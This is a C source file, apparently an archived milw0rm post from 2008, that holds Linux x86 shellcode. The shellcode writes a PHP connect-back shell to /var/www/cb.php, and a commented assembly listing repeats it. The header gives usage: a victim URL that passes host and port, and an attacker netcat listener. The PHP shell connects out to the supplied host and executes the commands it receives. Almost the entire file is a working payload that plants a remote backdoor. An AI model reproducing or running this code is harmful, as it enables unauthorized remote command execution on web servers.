#include <stdlib.h>

        /* Grayscale Research: Linux Write FS PHP Connect Back Utility Shellcode
         *
         *      Function:
         *              Opens /var/www/cb.php and writes a php connectback shell to the filesystem.
         *
         *      Shellcode Size: 508 bytes (No Encodings)
         *
         *      PHP Shell Usage:
         *              // victim
         *              http://vulnhost.com/cb.php?host=192.168.1.1?port=777
         *
         *              // attacker
         *              nc -l -p 777
         *
         *      greets: #c-, #hhp, #oldskewl, d-town, sd2600, dc214, everyone else.
	 *
	 *
         *      ~roonr
         */


	// shellcode
 	    char sc[] = "\x68\x70\x68\x70\xff\x68\x2f\x63\x62\x2e\x68\x2f\x77\x77\x77\x68"
			 "\x2f\x76\x61\x72\x31\xc0\x89\xe6\x88\x46\x0f\x89\xe3\x31\xc9\xb1"
			 "\x42\x31\xd2\xb2\xff\x31\xc0\xb0\x05\xcd\x80\x31\xdb\x88\xc3\x68"
			 "\x3f\x3e\xff\xff\x68\x3b\x7d\x20\x7d\x68\x24\x72\x29\x29\x68\x6c"
			 "\x65\x6e\x28\x68\x20\x73\x74\x72\x68\x20\x24\x72\x2c\x68\x6f\x63"
			 "\x6b\x2c\x68\x65\x28\x24\x73\x68\x77\x72\x69\x74\x68\x6b\x65\x74"
			 "\x5f\x68\x3b\x73\x6f\x63\x68\x31\x24\x20\x22\x68\x73\x75\x31\x2e"
			 "\x68\x5c\x6e\x63\x62\x68\x2e\x3d\x20\x22\x68\x60\x3b\x24\x72\x68"
			 "\x20\x60\x24\x69\x68\x24\x72\x20\x3d\x68\x30\x29\x29\x7b\x68\x2c"
			 "\x20\x31\x30\x68\x73\x6f\x63\x6b\x68\x61\x64\x28\x24\x68\x74\x5f"
			 "\x72\x65\x68\x6f\x63\x6b\x65\x68\x24\x69\x3d\x73\x68\x69\x6c\x65"
			 "\x28\x68\x29\x3b\x77\x68\x68\x22\x2c\x31\x30\x68\x74\x65\x64\x3a"
			 "\x68\x6e\x6e\x65\x63\x68\x20\x22\x43\x6f\x68\x6f\x63\x6b\x2c\x68"
			 "\x65\x28\x24\x73\x68\x77\x72\x69\x74\x68\x6b\x65\x74\x5f\x68\x3b"
			 "\x73\x6f\x63\x68\x6f\x72\x74\x29\x68\x2c\x20\x24\x70\x68\x72\x65"
			 "\x73\x73\x68\x24\x61\x64\x64\x68\x63\x6b\x2c\x20\x68\x28\x24\x73"
			 "\x6f\x68\x6e\x65\x63\x74\x68\x5f\x63\x6f\x6e\x68\x63\x6b\x65\x74"
			 "\x68\x29\x3b\x73\x6f\x68\x5f\x54\x43\x50\x68\x2c\x53\x4f\x4c\x68"
			 "\x52\x45\x41\x4d\x68\x4b\x5f\x53\x54\x68\x2c\x53\x4f\x43\x68\x49"
			 "\x4e\x45\x54\x68\x28\x41\x46\x5f\x68\x65\x61\x74\x65\x68\x74\x5f"
			 "\x63\x72\x68\x6f\x63\x6b\x65\x68\x63\x6b\x3d\x73\x68\x3b\x24\x73"
			 "\x6f\x68\x72\x74\x27\x5d\x68\x5b\x27\x70\x6f\x68\x5f\x47\x45\x54"
			 "\x68\x72\x74\x3d\x24\x68\x3b\x24\x70\x6f\x68\x74\x27\x5d\x29\x68"
			 "\x27\x68\x6f\x73\x68\x47\x45\x54\x5b\x68\x65\x28\x24\x5f\x68\x79"
			 "\x6e\x61\x6d\x68\x6f\x73\x74\x62\x68\x67\x65\x74\x68\x68\x65\x73"
			 "\x73\x3d\x68\x61\x64\x64\x72\x68\x73\x65\x7b\x24\x68\x3b\x7d\x65"
			 "\x6c\x68\x34\x2e\x22\x29\x68\x72\x20\x34\x30\x68\x45\x72\x72\x6f"
			 "\x68\x6e\x74\x28\x22\x68\x7b\x70\x72\x69\x68\x74\x27\x5d\x29\x68"
			 "\x27\x70\x6f\x72\x68\x47\x45\x54\x5b\x68\x26\x21\x24\x5f\x68\x74"
			 "\x27\x5d\x26\x68\x27\x68\x6f\x73\x68\x47\x45\x54\x5b\x68\x28\x21"
			 "\x24\x5f\x68\x50\x20\x69\x66\x68\x3c\x3f\x50\x48\x31\xc0\x89\xe6"
			 "\xb0\x04\x89\xe1\x66\xba\x62\x01\xcd\x80";


int main(){


	// run shellcode
        asm("JMP %0;" : "=m" (sc));

	/*
		asm volatile(
		    "cb_shellcode:\n"
		    "push $0xff706870;"
		    "push $0x2e62632f;"
		    "push $0x7777772f;"
		    "push $0x7261762f;"
		    "xor %eax, %eax;"
		    "mov %esp, %esi;"
		    "movb %al, 0xf(%esi);"

		    // sys_open
		    "mov %esp, %ebx; "
                    "xor %ecx, %ecx;"
			    "movb $0x42, %cl;"
		    	"xor %edx, %edx;"
			    "movb $0xff, %dl;"
		    	"xor %eax, %eax;"
	 		    "movb $0x05, %al;"
		    "int $0x80;"

		    // sys_write
		    "xor %ebx, %ebx;"
		    "mov %al, %bl;"

			// php connectback shellcode
			"push $0xffff3e3f; push $0x7d207d3b; push $0x29297224; push $0x286e656c;"
			"push $0x72747320; push $0x2c722420; push $0x2c6b636f; push $0x73242865;"
			"push $0x74697277; push $0x5f74656b; push $0x636f733b; push $0x22202431;"
			"push $0x2e317573; push $0x62636e5c; push $0x22203d2e; push $0x72243b60;"
			"push $0x69246020; push $0x3d207224; push $0x7b292930; push $0x3031202c;"
			"push $0x6b636f73; push $0x24286461; push $0x65725f74; push $0x656b636f;"
			"push $0x733d6924; push $0x28656c69; push $0x68773b29; push $0x30312c22;"
			"push $0x3a646574; push $0x63656e6e; push $0x6f432220; push $0x2c6b636f;"
			"push $0x73242865; push $0x74697277; push $0x5f74656b; push $0x636f733b;"
			"push $0x2974726f; push $0x7024202c; push $0x73736572; push $0x64646124;"
			"push $0x202c6b63; push $0x6f732428; push $0x7463656e; push $0x6e6f635f;"
			"push $0x74656b63; push $0x6f733b29; push $0x5043545f; push $0x4c4f532c;"
			"push $0x4d414552; push $0x54535f4b; push $0x434f532c; push $0x54454e49;"
			"push $0x5f464128; push $0x65746165; push $0x72635f74; push $0x656b636f;"
			"push $0x733d6b63; push $0x6f73243b; push $0x5d277472; push $0x6f70275b;"
			"push $0x5445475f; push $0x243d7472; push $0x6f70243b; push $0x295d2774;"
			"push $0x736f6827; push $0x5b544547; push $0x5f242865; push $0x6d616e79;"
			"push $0x6274736f; push $0x68746567; push $0x3d737365; push $0x72646461;"
			"push $0x247b6573; push $0x6c657d3b; push $0x29222e34; push $0x30342072;"
			"push $0x6f727245; push $0x2228746e; push $0x6972707b; push $0x295d2774;"
			"push $0x726f7027; push $0x5b544547; push $0x5f242126; push $0x265d2774;"
			"push $0x736f6827; push $0x5b544547; push $0x5f242128; push $0x66692050;"
			"push $0x48503f3c;"

		   "xor %eax, %eax;"
	    	   "mov %esp, %esi;"
		   "movb $0x04, %al;"
		   "mov %esp, %ecx;"
		   "mov $0x162, %dx;"
		   "int $0x80;");

	*/

}

// milw0rm.com [2008-08-18]